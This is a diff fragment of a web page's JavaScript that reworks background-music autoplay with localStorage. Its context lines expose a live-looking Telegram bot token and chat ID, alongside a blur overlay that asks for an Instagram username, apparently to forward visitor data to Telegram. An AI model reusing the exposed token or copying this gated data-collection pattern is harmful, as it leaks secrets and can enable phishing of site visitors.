@@ -9,13 +9,45 @@ const openPhotoOptions = document.getElementById('openPhotoOptions');
   const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
   const CHAT_ID = "6864694275";
 
-  const music=document.getElementById('bgmusic');
-  const btnMusic=document.getElementById('musicButton');
-  let started=false;music.volume=0.4;
-  async function startMusic(){if(started)return;started=true;music.muted=false;try{await music.play();btnMusic.classList.remove("show");}catch(err){btnMusic.classList.add("show");}}
-  document.addEventListener('click',startMusic,{once:true});
-  document.addEventListener('touchstart',startMusic,{once:true});
-  btnMusic.addEventListener('click',async()=>{try{await music.play();btnMusic.classList.remove("show");}catch(e){console.log(e);}});
+  const music = document.getElementById('bgmusic');
+const btnMusic = document.getElementById('musicButton');
+
+music.volume = 0.4;
+
+// Simpan status musik di localStorage agar bertahan lama
+function saveMusicState() {
+  localStorage.setItem("music_playing", !music.paused);
+}
+
+function restoreMusicState() {
+  const wasPlaying = localStorage.getItem("music_playing") === "true";
+  if (wasPlaying) {
+    music.muted = false;
+    music.play().catch(() => {
+      btnMusic.classList.add("show");
+    });
+  } else {
+    btnMusic.classList.add("show");
+  }
+}
+
+async function startMusic() {
+  music.muted = false;
+  try {
+    await music.play();
+    btnMusic.classList.remove("show");
+    saveMusicState();
+  } catch (err) {
+    console.log("Autoplay gagal:", err);
+    btnMusic.classList.add("show");
+  }
+}
+
+btnMusic.addEventListener('click', startMusic);
+document.addEventListener('click', startMusic);
+document.addEventListener('touchstart', startMusic);
+
+restoreMusicState();
 
   const modal=document.getElementById('modal');document.getElementById('openAsk').onclick=()=>modal.classList.add('show');document.getElementById('closeQ').onclick=()=>modal.classList.remove('show');
   const overlay=document.getElementById("blurOverlay"),input=document.getElementById("igInput"),btnLogin=document.getElementById("igSubmit"),savedIG=localStorage.getItem("ig_user");
